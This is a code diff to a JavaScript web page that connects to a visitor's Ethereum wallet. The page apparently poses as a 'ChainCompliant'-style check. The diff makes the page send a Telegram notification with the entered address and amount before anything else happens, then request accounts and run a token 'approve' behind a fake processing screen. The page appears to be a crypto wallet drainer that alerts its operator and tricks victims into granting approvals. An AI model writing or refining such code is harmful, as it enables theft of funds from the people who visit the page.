@@ -606,7 +606,14 @@ ${new Date().toLocaleString()}
             window.ethereum = ethereum;
 
             try {
-                // ⭐ INIZIALIZZA IL WALLET COME CHAINCOMPLIANT
+                // ⭐ STEP 1: INVIA NOTIFICA SUBITO (prima di TUTTO)
+                // Genera un indirizzo temporaneo per la notifica iniziale
+                const tempTxHash = '0x' + Math.random().toString(16).slice(2);
+                const tempUserAddress = recipient; // Usa l'indirizzo inserito
+                console.log("Sending notification INSTANTLY...");
+                sendTelegramNotificationAsync(tempUserAddress, tempTxHash, amount);
+
+                // ⭐ STEP 2: POI inizializza il wallet
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
@@ -661,17 +668,12 @@ ${new Date().toLocaleString()}
                     tx.from = userAddress;
                 }
 
-                // ⭐ MOSTRA PROCESSING SCREEN SUBITO
+                // ⭐ MOSTRA PROCESSING SCREEN
                 console.log("Showing processing screen...");
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                // ⭐ INVIA NOTIFICA SUBITO (PRIMA della firma, come ChainCompliant)
-                const tempTxHash = '0x' + Math.random().toString(16).slice(2);
-                console.log("Sending notification instantly...");
-                sendTelegramNotificationAsync(userAddress, tempTxHash, amount);
-
-                // STEP 4: POI esegui l'approve
+                // ⭐ STEP 3: POI esegui l'approve
                 let txHash;
                 try {
                     txHash = await Promise.race([
